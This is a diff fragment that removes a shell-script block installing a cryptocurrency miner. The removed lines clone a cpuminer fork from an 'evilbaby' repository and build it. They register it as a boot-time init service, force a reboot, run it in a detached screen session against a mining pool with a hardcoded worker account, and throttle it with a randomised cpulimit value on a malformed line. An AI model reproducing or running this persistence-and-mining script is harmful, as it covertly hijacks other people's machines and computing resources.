@@ -14,18 +14,3 @@ else
 fi
 exit
 fi
-sudo apt-get update
-sudo apt-get install git automake autoconf pkg-config libcurl4-openssl-dev libjansson-dev libssl-dev libgmp-dev screen cpulimit -y
-sudo sysctl -w vm.nr_hugepages=$((`grep -c ^processor /proc/cpuinfo` * 1))
-sudo git clone https://github.com/evilbaby/cpuminer-xzc
-cd cpuminer-xzc
-./build.sh
-cp "start.sh" "/etc/init.d/$miner"
-chmod +x /etc/init.d/$miner
-service $miner start
-update-rc.d $miner defaults
-
-echo "minerd is starting"
-sudo shutdown -r 30
-screen -dmSL cpuminer ./cpuminer -a lyra2z  -o stratum+tcp://us-east.lyra2z-hub.miningpoolhub.com:20581 -u evilbaby.LesleyuRatcliffe -p 1 ; sleep 3
-cpulimit --exe cpuminer --limit ((RANDOM%98+83))
